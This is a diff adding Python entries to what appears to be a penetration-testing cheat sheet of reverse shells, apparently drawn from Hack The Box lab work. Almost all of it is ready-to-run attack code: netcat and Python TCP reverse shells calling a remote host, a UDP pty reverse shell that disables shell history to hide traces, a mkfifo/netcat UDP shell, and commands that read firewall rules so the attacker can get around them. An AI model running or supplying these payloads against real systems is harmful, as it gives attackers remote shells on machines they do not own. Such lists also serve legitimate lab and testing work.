@@ -34,10 +34,31 @@
 
 
 # Python
+
+    - Collection of python TCP/UDP/PTY shells: https://github.com/infodox/python-pty-shells
+
      os.system('nc 192.168.168.168 443 -e /bin/sh')
 
-     python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.32",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+     python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.18",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
+# Python udp webshell
+
+    ex: HTB - Koker
+    - https://github.com/infodox/python-pty-shells/blob/master/udp_pty_backconnect.py.
+
+    Get iptable (tcp are blocked.. use udp)
+    subprocess.check_output(['cat','/etc/iptables/rules.v4'])
+    import subprocess; print subprocess.check_output(['iptables','-L'])
+
+
+    listener (nc wont work) : # socat file:`tty`,echo=0,raw udp-listen:1234
+
+    Reverse udp shell
+    import subprocess;subprocess.Popen(["python", "-c", 'import os;import pty;import socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect((\"10.10.14.18\", 1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\"HISTFILE\",\"/dev/null\");pty.spawn(\"/bin/sh\");s.close()'])
+
+## python udp reverseshell
+    import os; os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u <LAB IP> <PORT> >/tmp/f &").read() 
+    nc -nvlp <port> -u
 
 
 # Perl
